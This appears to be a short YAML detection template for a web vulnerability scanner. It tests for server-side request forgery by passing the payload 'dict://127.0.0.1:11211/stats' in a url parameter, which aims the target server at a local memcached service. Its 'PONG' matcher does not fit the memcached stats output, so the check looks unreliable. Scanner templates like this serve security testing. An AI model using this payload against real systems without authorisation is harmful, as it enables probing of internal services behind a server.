id: ssrf4-37
name: 'SSRF scheme dict via url'
severity: high
type: active
tags:
  - ssrf
  - oob
  - scheme
description: 'Fetches dict URL via url (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      url:
        - 'dict://127.0.0.1:11211/stats'
    matchers:
      - type: word
        part: body
        words:
          - 'PONG'
